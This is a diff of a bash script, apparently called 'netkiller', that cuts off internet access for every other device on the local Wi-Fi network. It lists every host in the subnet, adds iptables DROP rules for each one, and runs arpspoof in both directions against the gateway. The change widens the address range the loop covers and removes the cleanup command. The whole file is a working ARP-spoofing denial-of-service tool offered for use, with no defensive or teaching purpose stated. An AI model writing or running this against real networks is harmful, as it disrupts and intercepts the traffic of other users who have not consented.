@@ -1,52 +1,44 @@
 #!/bin/bash
 
-# Block internet for all users on wlan0 except your own IP
-# Dependencies: arpspoof, iptables, ipcalc, awk
-
-# Variables
 INTERFACE="wlan0"
 GATEWAY=$(ip route | grep default | awk '{print $3}')
 MYIP=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
-NETWORK_INFO=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}')
-SUBNET=$(echo $NETWORK_INFO | cut -d/ -f2)
-NETWORK=$(ipcalc -n "$NETWORK_INFO" | grep Network | awk '{print $2}' | cut -d/ -f1)
+NETWORK_CIDR=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}')
 
-# Get all hosts in subnet except your own and the gateway
-IP_LIST=$(ipcalc -b "$NETWORK/$SUBNET" | grep Hosts | awk '{print $4}' | sed 's/,//')
-ALL_HOSTS=$(ipcalc -n "$NETWORK/$SUBNET" | grep HostMin | awk '{print $2}')
-END_HOST=$(ipcalc -n "$NETWORK/$SUBNET" | grep HostMax | awk '{print $2}')
+# Get first and last usable IP
+HOSTMIN=$(ipcalc "$NETWORK_CIDR" | grep HostMin | awk '{print $2}')
+HOSTMAX=$(ipcalc "$NETWORK_CIDR" | grep HostMax | awk '{print $2}')
 
-# Function to get all IPs in subnet
-function get_all_ips() {
-    IFS=. read i1 i2 i3 i4 <<<"$ALL_HOSTS"
-    IFS=. read j1 j2 j3 j4 <<<"$END_HOST"
-    for i in $(seq $i4 $j4); do
-        echo "$i1.$i2.$i3.$i"
-    done
+# IP to decimal
+ip2dec() {
+    IFS=. read -r a b c d <<< "$1"
+    echo "$(( (a << 24) + (b << 16) + (c << 8) + d ))"
 }
 
-# Enable IP forwarding (required for arpspoof/iptables)
+# Decimal to IP
+dec2ip() {
+    local dec=$1
+    echo "$(( (dec >> 24) & 255 )).$(( (dec >> 16) & 255 )).$(( (dec >> 8) & 255 )).$(( dec & 255 ))"
+}
+
+MIN=$(ip2dec "$HOSTMIN")
+MAX=$(ip2dec "$HOSTMAX")
+
+# Enable IP forwarding for routing (if desired)
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Block forwarding from others
-for IP in $(get_all_ips); do
+for (( i=$MIN; i<=$MAX; i++ )); do
+    IP=$(dec2ip $i)
     if [[ "$IP" != "$MYIP" && "$IP" != "$GATEWAY" ]]; then
-        # Block this IP from forwarding to the internet
+
+        # Block traffic 
         iptables -A FORWARD -s "$IP" -j DROP
-        iptables -I FORWARD -d "$IP" -j DROP
-        # Start arpspoof for this IP
+        iptables -A FORWARD -d "$IP" -j DROP
+        # Propagate ARP spoofing to this IP
         arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
     fi
 done
 
-echo "Blocking all wifi clients internet on $INTERFACE except your IP $MYIP."
-echo "To stop, run: netkiller-stop"
-
-# Clean the rules
-cat > /bin/netkiller-stop << EOF
-iptables -F
-iptables -F FORWARD
-killall arpspoof
-EOF
-chmod 755 /bin/netkiller-stop
+echo "ARP spoofing all IPs in $NETWORK_CIDR except $MYIP and $GATEWAY."
+echo "Press Ctrl+C to stop."
